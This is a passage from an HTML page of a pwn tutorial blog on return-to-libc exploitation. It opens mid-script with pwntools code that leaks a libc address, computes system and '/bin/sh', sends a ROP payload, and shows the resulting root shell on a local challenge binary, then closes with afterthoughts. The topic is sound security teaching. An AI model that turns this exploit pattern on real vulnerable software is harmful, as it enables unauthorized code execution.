</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=n>OFFSET</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>extra</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>leak</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;leak: </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>leak</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>LIBCGETSOFFSET</span> <span class=o>=</span> <span class=mh>0x75b60</span>
</span></span><span class=line><span class=cl><span class=n>LIBCSYSTEMOFFSET</span> <span class=o>=</span> <span class=mh>0x48e50</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>libcbase</span> <span class=o>=</span> <span class=n>leak</span> <span class=o>-</span> <span class=n>LIBCGETSOFFSET</span>
</span></span><span class=line><span class=cl><span class=n>libcsystem</span> <span class=o>=</span> <span class=n>libcbase</span> <span class=o>+</span> <span class=n>LIBCSYSTEMOFFSET</span>
</span></span><span class=line><span class=cl><span class=n>binsh</span> <span class=o>=</span> <span class=n>libcbase</span> <span class=o>+</span> <span class=mh>0x18a156</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload2</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span> <span class=o>*</span> <span class=n>OFFSET</span>
</span></span><span class=line><span class=cl><span class=n>payload2</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>POPRDI</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>binsh</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload2</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libcsystem</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></div><p>Running this script, we get a <code>shell()</code> !!</p><pre tabindex=0><code>[x] Starting local process &#39;./chall&#39;
[+] Starting local process &#39;./chall&#39;: pid 11487
[*] leak: 0x7f2babd92b60
[*] Switching to interactive mode

$ id
uid=0(root) gid=0(root) groups=0(root)

$ whoami
root
</code></pre><br><h2 id=afterthoughts>Afterthoughts</h2><p>Was this painful for you?</p><p>Too many addresses to leak?</p><p>It was painful for me as much as it will be for you but I really hope that going through all the manual labor was an enriching learning experience for you on how things actually work and that you don&rsquo;t become over-reliant on automation.</p><p>Nevertheless, in part 2 of Ret2Libc, we will explore the same program and write another script, this time <strong>without finding a single value ourselves</strong>.</p><p><br><br></p><hr><div style=text-align:right><a href=/pwn/rop/ret2libc2>Next Page: Return 2 Libc - Automated With Pwntools</a></div></div></article><hr style=margin-top:40px;margin-bottom:40px><div id=disqus_thread></div><script>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//caprinux.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></main></div><footer class=footer><span class=footer_item></span>&nbsp;<div class=footer_social-icons><a href=https://github.com/caprinux target=_blank rel="noopener noreferrer me" title=Github><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg></a><a href=https://x.com/elma_ios target=_blank rel="noopener noreferrer me" title=Twitter><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9.0 01-3.14 1.53 4.48 4.48.0 00-7.86 3v1A10.66 10.66.0 013 4s-4 9 5 13a11.64 11.64.0 01-7 2c9 5 20 0 20-11.5a4.5 4.5.0 00-.08-.83A7.72 7.72.0 0023 3z"/></svg></a><a href=index.xml target=_blank rel="noopener noreferrer me" title=Rss><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></div><small class=footer_copyright>© 2023 elma.
Powered by <a href=https://github.com/hugo-sid/hugo-blog-awesome target=_blank rel=noopener>Hugo blog awesome</a>.</small></footer><a href=# title="Go to top" id=totop><svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentcolor" stroke="currentcolor" viewBox="0 96 960 960"><path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197z"/></svg></a><script src=https://blog.caprinux.com/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30+lSNuSkl4QXuNyy8="></script></body></html>